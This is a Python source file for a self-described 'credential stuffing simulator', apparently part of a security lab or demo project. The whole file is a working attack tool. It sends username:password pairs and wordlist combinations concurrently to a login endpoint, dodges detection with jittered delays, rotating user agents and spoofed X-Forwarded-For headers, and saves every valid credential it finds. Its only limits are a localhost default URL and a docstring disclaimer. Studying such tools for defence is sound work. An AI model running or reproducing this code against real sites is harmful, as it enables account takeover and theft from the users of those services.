"""
Credential stuffing simulator (authorized local testing only).
"""

from __future__ import annotations

import argparse
import asyncio
import itertools
import json
import sys
import time
from dataclasses import asdict, dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import List

import aiohttp
from colorama import Fore, Style, init

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    # Ensure sibling modules (evasion/, defense/) are importable when run as a script.
    sys.path.insert(0, str(REPO_ROOT))

from evasion import DelayManager, IPRotator, UserAgentRotator

init(autoreset=True)


@dataclass(slots=True)
class Credential:
    username: str
    password: str


@dataclass(slots=True)
class AttemptResult:
    username: str
    password: str
    status: str
    http_status: int | None
    response_snippet: str
    user_agent: str
    spoofed_ip: str
    latency_ms: int
    timestamp_utc: str


@dataclass(slots=True)
class AttackConfig:
    url: str
    mode: str
    credentials_file: Path | None
    usernames_file: Path | None
    passwords_file: Path | None
    concurrency: int
    timeout_seconds: int
    min_delay: float
    max_delay: float
    max_combinations: int
    proxy_list_file: Path | None
    http_proxy: str | None
    success_pattern: str
    reports_dir: Path


class AttackEngine:
    def __init__(self, config: AttackConfig) -> None:
        self.config = config
        self.credentials: List[Credential] = []
        self.results: List[AttemptResult] = []
        self.successful_logins: List[AttemptResult] = []
        self.failed_attempts = 0
        self.error_attempts = 0
        self._lock = asyncio.Lock()
        self.user_agent_rotator = UserAgentRotator()
        proxy_list_path = str(config.proxy_list_file) if config.proxy_list_file else None
        self.ip_rotator = IPRotator(proxy_list_path=proxy_list_path)

    def load_credentials(self) -> None:
        if self.config.mode == "pair":
            if not self.config.credentials_file or not self.config.credentials_file.exists():
                raise FileNotFoundError(f"Credentials file not found: {self.config.credentials_file}")

            loaded: list[Credential] = []
            with self.config.credentials_file.open("r", encoding="utf-8") as handle:
                for idx, line in enumerate(handle, start=1):
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" not in line:
                        raise ValueError(
                            f"Invalid credentials format at line {idx}. Expected username:password"
                        )
                    username, password = line.split(":", 1)
                    loaded.append(Credential(username=username.strip(), password=password.strip()))

            if not loaded:
                raise ValueError("No valid credentials were loaded.")
            self.credentials = loaded
            print(f"{Fore.CYAN}Loaded {len(self.credentials)} username:password pairs.")
            return

        if not self.config.usernames_file or not self.config.usernames_file.exists():
            raise FileNotFoundError(f"Usernames file not found: {self.config.usernames_file}")
        if not self.config.passwords_file or not self.config.passwords_file.exists():
            raise FileNotFoundError(f"Passwords file not found: {self.config.passwords_file}")

        usernames = self._read_wordlist(self.config.usernames_file)
        passwords = self._read_wordlist(self.config.passwords_file)
        if not usernames or not passwords:
            raise ValueError("Usernames/passwords list is empty.")

        # Password-major ordering spreads attempts across many users first, which
        # better matches stuffing behavior and finds valid pairs earlier in demos.
        combos_iter = (
            (username, password)
            for password, username in itertools.product(passwords, usernames)
        )
        if self.config.max_combinations > 0:
            combos_iter = itertools.islice(combos_iter, self.config.max_combinations)

        self.credentials = [Credential(username=u, password=p) for u, p in combos_iter]
        print(
            f"{Fore.CYAN}Loaded combo mode: {len(usernames)} usernames x {len(passwords)} passwords "
            f"-> {len(self.credentials)} attempts."
        )

    @staticmethod
    def _read_wordlist(path: Path) -> list[str]:
        values: list[str] = []
        with path.open("r", encoding="utf-8") as handle:
            for line in handle:
                item = line.strip()
                if item and not item.startswith("#"):
                    values.append(item)
        return values

    @staticmethod
    def _now_utc() -> str:
        return datetime.now(timezone.utc).isoformat(timespec="seconds")

    async def _attempt_login(
        self,
        session: aiohttp.ClientSession,
        semaphore: asyncio.Semaphore,
        credential: Credential,
        index: int,
        total: int,
    ) -> None:
        async with semaphore:
            # Delay jitter avoids perfectly periodic traffic and simulates evasive pacing.
            await DelayManager.random_delay(
                min_delay=self.config.min_delay,
                max_delay=self.config.max_delay,
            )

            user_agent = self.user_agent_rotator.get_random_user_agent()
            spoofed_ip = self.ip_rotator.generate_fake_ip()
            headers = {
                "User-Agent": user_agent,
                "X-Forwarded-For": spoofed_ip,
                "X-Real-IP": spoofed_ip,
            }
            payload = {"username": credential.username, "password": credential.password}

            start = time.perf_counter()
            status: str
            http_status: int | None = None
            response_snippet = ""

            try:
                # Optional upstream HTTP proxy lets us route attack traffic via Burp.
                async with session.post(
                    self.config.url,
                    data=payload,
                    headers=headers,
                    proxy=self.config.http_proxy,
                ) as response:
                    http_status = response.status
                    response_text = (await response.text()).strip()
                    response_snippet = response_text[:120]
                    if self.config.success_pattern.lower() in response_text.lower():
                        status = "success"
                    else:
                        status = "failed"
            except asyncio.TimeoutError:
                status = "timeout"
                response_snippet = "Request timed out"
            except aiohttp.ClientError as exc:
                status = "error"
                response_snippet = str(exc)[:120]

            latency_ms = int((time.perf_counter() - start) * 1000)
            result = AttemptResult(
                username=credential.username,
                password=credential.password,
                status=status,
                http_status=http_status,
                response_snippet=response_snippet,
                user_agent=user_agent,
                spoofed_ip=spoofed_ip,
                latency_ms=latency_ms,
                timestamp_utc=self._now_utc(),
            )

            async with self._lock:
                self.results.append(result)
                if status == "success":
                    self.successful_logins.append(result)
                    color = Fore.GREEN
                elif status == "failed":
                    self.failed_attempts += 1
                    color = Fore.YELLOW
                else:
                    self.error_attempts += 1
                    color = Fore.RED

                print(
                    f"{color}[{index}/{total}] {credential.username}:{credential.password} -> "
                    f"{status.upper()} (HTTP {http_status}, {latency_ms}ms)"
                )

    async def run(self) -> None:
        self.load_credentials()

        timeout = aiohttp.ClientTimeout(total=self.config.timeout_seconds)
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        semaphore = asyncio.Semaphore(self.config.concurrency)

        print(f"{Fore.CYAN}Starting attack simulation against {self.config.url}")
        print(
            f"{Fore.CYAN}Concurrency={self.config.concurrency} | "
            f"Delay={self.config.min_delay:.2f}-{self.config.max_delay:.2f}s | "
            f"Timeout={self.config.timeout_seconds}s"
        )

        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            tasks = [
                asyncio.create_task(
                    self._attempt_login(
                        session=session,
                        semaphore=semaphore,
                        credential=cred,
                        index=index,
                        total=len(self.credentials),
                    )
                )
                for index, cred in enumerate(self.credentials, start=1)
            ]
            await asyncio.gather(*tasks)

        self._print_summary()
        self._write_report()

    def _print_summary(self) -> None:
        total = len(self.results)
        success_count = len(self.successful_logins)
        print("\n" + "=" * 64)
        print(f"{Fore.CYAN}Attack Summary")
        print("=" * 64)
        print(f"Total Attempts   : {total}")
        print(f"{Fore.GREEN}Successful Logins: {success_count}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Failed Attempts  : {self.failed_attempts}{Style.RESET_ALL}")
        print(f"{Fore.RED}Errors/Timeouts  : {self.error_attempts}{Style.RESET_ALL}")

        if success_count:
            print(f"\n{Fore.GREEN}Discovered Valid Credentials:")
            for attempt in self.successful_logins:
                print(f"  - {attempt.username}:{attempt.password}")

    def _write_report(self) -> None:
        self.config.reports_dir.mkdir(parents=True, exist_ok=True)
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        report_path = self.config.reports_dir / f"attack_report_{timestamp}.json"

        report_data = {
            "meta": {
                "generated_at_utc": self._now_utc(),
                "target_url": self.config.url,
                "mode": self.config.mode,
                "credentials_file": str(self.config.credentials_file) if self.config.credentials_file else None,
                "usernames_file": str(self.config.usernames_file) if self.config.usernames_file else None,
                "passwords_file": str(self.config.passwords_file) if self.config.passwords_file else None,
                "total_credentials": len(self.credentials),
                "concurrency": self.config.concurrency,
                "delay_range_seconds": [self.config.min_delay, self.config.max_delay],
                "timeout_seconds": self.config.timeout_seconds,
                "max_combinations": self.config.max_combinations,
                "proxy_list_file": str(self.config.proxy_list_file) if self.config.proxy_list_file else None,
                "http_proxy": self.config.http_proxy,
                "success_pattern": self.config.success_pattern,
            },
            "summary": {
                "total_attempts": len(self.results),
                "successful_logins": len(self.successful_logins),
                "failed_attempts": self.failed_attempts,
                "errors_or_timeouts": self.error_attempts,
            },
            "successful_credentials": [
                {"username": item.username, "password": item.password}
                for item in self.successful_logins
            ],
            "attempts": [asdict(item) for item in self.results],
        }

        with report_path.open("w", encoding="utf-8") as handle:
            json.dump(report_data, handle, indent=2)

        print(f"\n{Fore.CYAN}Saved report: {report_path}")


def parse_args() -> argparse.Namespace:
    script_dir = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(
        description="Credential stuffing attack simulator for authorized local environments."
    )
    parser.add_argument(
        "--mode",
        choices=["pair", "combo"],
        default="combo",
        help="Attack dataset mode: pair=username:password lines, combo=usernames x passwords.",
    )
    parser.add_argument(
        "--url",
        default="http://localhost:5000/login",
        help="Target login endpoint URL (default: http://localhost:5000/login)",
    )
    parser.add_argument(
        "--credentials",
        default=str(script_dir / "credentials.txt"),
        help="Path to credentials file (default: credentials.txt)",
    )
    parser.add_argument(
        "--usernames-file",
        default=str(script_dir / "usernames.txt"),
        help="Path to username wordlist for combo mode.",
    )
    parser.add_argument(
        "--passwords-file",
        default=str(script_dir / "passwords.txt"),
        help="Path to password wordlist for combo mode.",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=10,
        help="Maximum concurrent requests (default: 10)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=8,
        help="Request timeout in seconds (default: 8)",
    )
    parser.add_argument(
        "--min-delay",
        type=float,
        default=0.10,
        help="Minimum randomized delay between attempts (default: 0.10)",
    )
    parser.add_argument(
        "--max-delay",
        type=float,
        default=0.60,
        help="Maximum randomized delay between attempts (default: 0.60)",
    )
    parser.add_argument(
        "--max-combinations",
        type=int,
        default=900,
        help="Maximum combo attempts in combo mode (default: 900 for 30x30). Use 0 for all.",
    )
    parser.add_argument(
        "--proxy-list",
        default=str(script_dir / "proxy_list.txt"),
        help="Path to proxy/IP list used for rotation (default: proxy_list.txt).",
    )
    parser.add_argument(
        "--http-proxy",
        default=None,
        help="Route requests through an HTTP proxy (Burp), e.g. http://127.0.0.1:8080 or http://host.docker.internal:8080",
    )
    parser.add_argument(
        "--success-pattern",
        default="Login Successful",
        help='Case-insensitive response text indicating success (default: "Login Successful")',
    )
    parser.add_argument(
        "--reports-dir",
        default=str(script_dir / "reports"),
        help="Directory for JSON attack reports (default: reports)",
    )
    return parser.parse_args()


def build_config(args: argparse.Namespace) -> AttackConfig:
    if args.concurrency < 1:
        raise ValueError("--concurrency must be >= 1")
    if args.timeout < 1:
        raise ValueError("--timeout must be >= 1")
    if args.min_delay < 0 or args.max_delay < 0:
        raise ValueError("--min-delay and --max-delay must be >= 0")
    if args.min_delay > args.max_delay:
        raise ValueError("--min-delay cannot be greater than --max-delay")
    if args.max_combinations < 0:
        raise ValueError("--max-combinations must be >= 0")

    credentials_path = Path(args.credentials).expanduser().resolve()
    usernames_path = Path(args.usernames_file).expanduser().resolve()
    passwords_path = Path(args.passwords_file).expanduser().resolve()
    proxy_list_path = Path(args.proxy_list).expanduser().resolve()
    reports_path = Path(args.reports_dir).expanduser().resolve()

    return AttackConfig(
        url=args.url,
        mode=args.mode,
        credentials_file=credentials_path,
        usernames_file=usernames_path,
        passwords_file=passwords_path,
        concurrency=args.concurrency,
        timeout_seconds=args.timeout,
        min_delay=args.min_delay,
        max_delay=args.max_delay,
        max_combinations=args.max_combinations,
        proxy_list_file=proxy_list_path,
        http_proxy=args.http_proxy,
        success_pattern=args.success_pattern,
        reports_dir=reports_path,
    )


async def main() -> None:
    args = parse_args()
    config = build_config(args)
    engine = AttackEngine(config)
    await engine.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (ValueError, FileNotFoundError) as exc:
        print(f"{Fore.RED}Configuration error: {exc}")
